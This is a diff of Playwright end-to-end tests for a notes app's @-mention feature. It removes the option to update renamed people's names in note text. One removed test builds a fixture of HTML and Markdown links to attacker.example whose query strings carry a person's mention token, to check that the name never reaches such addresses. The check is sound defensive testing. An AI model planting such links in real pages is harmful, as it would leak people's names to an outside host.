@@ -392,32 +392,20 @@ test('a note mentions a person; Escape in the list keeps the edit; the trash lea
     await expect(typed.locator('.mention, .mention-unresolved')).toHaveCount(0);
 
     // After a rename the card shows the new name, and editing the note
-    // changes nothing in its text unasked: the editor says the name is
-    // older and offers to update it.
+    // changes nothing in its text unasked: the name as typed stays.
     const king = `e2e Ada King ${stamp}`;
     expect((await request.put(`/api/people/${ada.id}`, { data: { display_name: king } })).status()).toBe(200);
     await page.reload();
     await expect(card.locator('a.mention')).toHaveText(`@${king}`);
     await card.locator('button[title="Edit note"]').click();
     const again = card.getByPlaceholder('Note…');
-    await expect(card.getByTestId('stale-mentions')).toContainText('1 mention shows an older name.');
     await again.press('End');
     await again.pressSequentially(' more words', { delay: 5 });
     await card.getByRole('button', { name: 'Save', exact: true }).click();
     await expect(card.getByText('more words')).toBeVisible();
+    await expect(card.locator('a.mention')).toHaveText(`@${king}`);
     const saved: { id: string; body: string }[] = await (await request.get(`/api/nodes/${node.id}/notes`)).json();
     expect(saved.find((n) => n.id === noteId)?.body).toContain(token(ada));
-    // "Update" does it, as an edit the author makes.
-    await card.locator('button[title="Edit note"]').click();
-    await card.getByTestId('stale-mentions').getByRole('button', { name: 'Update' }).click();
-    await expect(card.getByTestId('stale-mentions')).toHaveCount(0);
-    await card.getByRole('button', { name: 'Save', exact: true }).click();
-    await expect
-      .poll(async () => {
-        const notes: { id: string; body: string }[] = await (await request.get(`/api/nodes/${node.id}/notes`)).json();
-        return notes.find((n) => n.id === noteId)?.body ?? '';
-      })
-      .toContain(token({ ...ada, display_name: king }));
 
     // In the trash a note is in nobody's "Mentioned in".
     expect(await mentionedIn()).toEqual([expect.objectContaining({ node_id: node.id, notes: 2 })]);
@@ -533,15 +521,13 @@ test('a token with someone else’s id names nobody, whoever saves it', async ({
     // comment, would otherwise be named to the planter by her next save.)
     await saveBody(request, node.id, `Met ${token(ada)}. And a word of hers.`);
     expect(await named(request, node.id)).toEqual([]);
-    // In her editor the token is not shown as a mention, and its name
-    // is not offered for update: "Update" would write her person's
-    // current name into text the other one reads.
+    // In her editor the token is not shown as a mention, whatever her
+    // person is called now.
     expect((await request.put(`/api/people/${ada.id}`, { data: { display_name: `e2e Ada King ${stamp}` } })).status()).toBe(200);
     await page.goto(`/nodes/${node.id}/edit`);
     await expect(page.getByPlaceholder(/Write in Markdown/)).toBeVisible();
     await expect(page.locator('.mention-unresolved')).toHaveText(`@${ada.display_name}`);
     await expect(page.locator('a.mention')).toHaveCount(0);
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
     expect((await request.put(`/api/people/${ada.id}`, { data: { display_name: ada.display_name } })).status()).toBe(200);
     // She mentions them again herself: out, then in, in saves of her own.
     await saveBody(request, node.id, 'taken out by its owner');
@@ -625,10 +611,7 @@ test('a deleted person’s mention keeps the name as typed, and the delete says 
   }
 });
 
-test('after a rename the editor offers to update the name in the text, and never does it unasked', async ({
-  page,
-  request,
-}) => {
+test('after a rename the page shows the new name, and the text stays as typed', async ({ page, request }) => {
   const stamp = newStamp();
   await wipe(request);
   const ada = await person(request, { display_name: `e2e Ada ${stamp}` });
@@ -644,116 +627,17 @@ test('after a rename the editor offers to update the name in the text, and never
     await expect(page.locator('a.mention')).toHaveText(`@${renamed.display_name}`);
     expect((await (await request.get(`/api/nodes/${node.id}`)).json()).body).toBe(before);
 
+    // So does the editor's preview, and nothing rewrites the name in the
+    // text: not opening the editor, and not an edit and a save.
     const editor = await openEditor(page, node.id);
-    const notice = page.getByTestId('stale-mentions');
-    await expect(notice).toContainText('1 mention shows an older name.');
+    await expect(page.locator('a.mention')).toHaveText(`@${renamed.display_name}`);
     await expect(editor).toHaveValue(before);
-    // Leaving without pressing it changes nothing.
+    await editor.press('End');
+    await editor.pressSequentially(' More.', { delay: 5 });
     await page.getByRole('button', { name: 'Done', exact: true }).click();
     await expect(page).toHaveURL(new RegExp(`/nodes/${node.id}$`));
-    expect((await (await request.get(`/api/nodes/${node.id}`)).json()).body).toBe(before);
-
-    // "Keep as typed" puts the notice away and changes nothing.
-    await openEditor(page, node.id);
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Keep as typed' }).click();
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    await expect(page.getByPlaceholder(/Write in Markdown/)).toHaveValue(before);
-    await page.getByRole('button', { name: 'Done', exact: true }).click();
-    await expect(page).toHaveURL(new RegExp(`/nodes/${node.id}$`));
-
-    // "Keep as typed" is for the names it was pressed for. Another
-    // person's older name is still offered afterwards, and "Update"
-    // then leaves the kept one alone.
-    const bea = await person(request, { display_name: `e2e Bea ${stamp}` });
-    const kept = await openEditor(page, node.id);
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Keep as typed' }).click();
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    await kept.press('End');
-    await kept.pressSequentially(` @Bea ${stamp}`.slice(0, -4), { delay: 15 });
-    await expect(list(page).locator('[aria-selected="true"]')).toHaveCount(1);
-    await page.keyboard.press('Enter');
-    await expect(kept).toHaveValue(`${before} ${token(bea)} `);
-    await kept.fill(`${before} ${token(bea, 'B')}`);
-    await expect(page.getByTestId('stale-mentions')).toContainText('1 mention shows an older name.');
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Update' }).click();
-    await expect(kept).toHaveValue(`${before} ${token(bea)}`);
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    await kept.fill(before);
-    await page.getByRole('button', { name: 'Done', exact: true }).click();
-    await expect(page).toHaveURL(new RegExp(`/nodes/${node.id}$`));
-    expect((await (await request.get(`/api/nodes/${node.id}`)).json()).body).toBe(before);
-
-    const editor3 = await openEditor(page, node.id);
-    // With the cursor inside the token (in its label):
-    await editor3.evaluate((el: HTMLTextAreaElement) => el.setSelectionRange(10, 10));
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Update' }).click();
-    await expect(editor3).toHaveValue(`Met ${token(renamed)}.`);
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    // The cursor is after the token, never inside it: the next key typed
-    // must not break the mention.
-    expect(await editor3.evaluate((el: HTMLTextAreaElement) => [el.selectionStart, el.selectionEnd])).toEqual([
-      `Met ${token(renamed)}`.length,
-      `Met ${token(renamed)}`.length,
-    ]);
-    // It is one edit of the box, with the keyboard back in it: undo takes
-    // it back (and the notice with it), redo makes it again.
-    await expect(editor3).toBeFocused();
-    await page.keyboard.press('ControlOrMeta+z');
-    await expect(editor3).toHaveValue(before);
-    await expect(page.getByTestId('stale-mentions')).toBeVisible();
-    await page.keyboard.press('ControlOrMeta+Shift+z');
-    await expect(editor3).toHaveValue(`Met ${token(renamed)}.`);
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    await page.getByRole('button', { name: 'Done', exact: true }).click();
-    await expect(page).toHaveURL(new RegExp(`/nodes/${node.id}$`));
-    expect((await (await request.get(`/api/nodes/${node.id}`)).json()).body).toBe(`Met ${token(renamed)}.`);
-
-    // A shorter name: the edit only takes characters out, and is still
-    // one edit. The cursor, at the end of the text, stays at the end.
-    const short = { ...ada, display_name: `e2e Ad ${stamp}` };
-    expect((await request.put(`/api/people/${ada.id}`, { data: { display_name: short.display_name } })).status()).toBe(
-      200,
-    );
-    const editor4 = await openEditor(page, node.id);
-    await editor4.evaluate((el: HTMLTextAreaElement) => el.setSelectionRange(el.value.length, el.value.length));
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Update' }).click();
-    await expect(editor4).toHaveValue(`Met ${token(short)}.`);
-    expect(await editor4.evaluate((el: HTMLTextAreaElement) => el.selectionStart)).toBe(`Met ${token(short)}.`.length);
-    await page.keyboard.press('ControlOrMeta+z');
-    await expect(editor4).toHaveValue(`Met ${token(renamed)}.`);
-  } finally {
-    await wipe(request);
-  }
-});
-
-test('Update leaves a token in a link’s address alone', async ({ page, request }) => {
-  const stamp = newStamp();
-  await wipe(request);
-  const ada = await person(request, { display_name: `e2e Ada ${stamp}` });
-  // A real mention, and the same token where the page shows no mention:
-  // in the address of a link, and in a Markdown link's address. Brought
-  // up to date there, the person's current name would go to that address
-  // on a click.
-  const planted = [
-    `<a href='https://attacker.example/?q=${token(ada)}'>Quarterly report</a>`,
-    `[Minutes](<https://attacker.example/?m=${token(ada)}>)`,
-  ].join(' ');
-  const before = `Met ${token(ada)}. ${planted}`;
-  const node = await createNode(request, `${NODE} planted ${stamp}`, { body: before });
-  const renamed = { ...ada, display_name: `e2e Ada King ${stamp}` };
-  expect(
-    (await request.put(`/api/people/${ada.id}`, { data: { display_name: renamed.display_name } })).status(),
-  ).toBe(200);
-  try {
-    const editor = await openEditor(page, node.id);
-    // One mention shows an older name, not three.
-    await expect(page.getByTestId('stale-mentions')).toContainText('1 mention shows an older name.');
-    await page.getByTestId('stale-mentions').getByRole('button', { name: 'Update' }).click();
-    await expect(editor).toHaveValue(`Met ${token(renamed)}. ${planted}`);
-    await expect(page.getByTestId('stale-mentions')).toHaveCount(0);
-    for (const link of await page.locator('.prose a[href^="http"]').all()) {
-      expect(await link.getAttribute('href')).not.toContain('King');
-    }
+    expect((await (await request.get(`/api/nodes/${node.id}`)).json()).body).toBe(`${before} More.`);
+    await expect(page.locator('a.mention')).toHaveText(`@${renamed.display_name}`);
   } finally {
     await wipe(request);
   }
